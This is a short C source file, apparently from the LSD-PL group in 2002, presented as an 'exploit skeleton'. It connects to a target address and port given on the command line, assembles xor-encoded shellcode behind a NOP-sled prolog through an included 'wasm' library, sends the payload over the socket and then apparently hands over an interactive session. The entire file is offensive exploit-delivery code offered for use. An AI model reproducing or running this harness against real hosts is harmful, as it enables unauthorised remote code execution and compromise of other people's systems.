/*## copyright LAST STAGE OF DELIRIUM aug 2002 poland        *://lsd-pl.net/ #*/
/*## wasm exploit skeleton                                                   #*/

#include "wasm.c"

wp_t prolog={
    "\x90\x90\x90",
    3
};

main(int argc,char **argv){
    struct hostent *hp;struct sockaddr_in adr;int sck;
    wa_t wa;

    printf("copyright LAST STAGE OF DELIRIUM aug 2002 poland  //lsd-pl.net/\n");
    printf("wasm exploit skeleton\n\n");

    if(argc!=5) {printf("usage: wexp addr port -n wacfg\n");exit(0);}

    wa_ini(&wa);

    sck=socket(AF_INET,SOCK_STREAM,0);
    adr.sin_family=AF_INET;
    adr.sin_port=htons((unsigned short)atoi(argv[2]));
    if((adr.sin_addr.s_addr=inet_addr(argv[1]))==-1){
        if((hp=gethostbyname(argv[1]))==NULL) goto err;
        memcpy(&adr.sin_addr.s_addr,hp->h_addr,4);
    }
    if(connect(sck,(struct sockaddr*)&adr,sizeof(adr))) goto err;

    wa_cfg(&wa,"core: xore,init,%s,disp",argv[4],sck,argv[1],0,0);
    wa_asm(&wa);

    send(sck,wa.a.b,wa.a.l,0);

    wa_net(&wa);

    exit(0);
err:
    printf("error\n");;
}

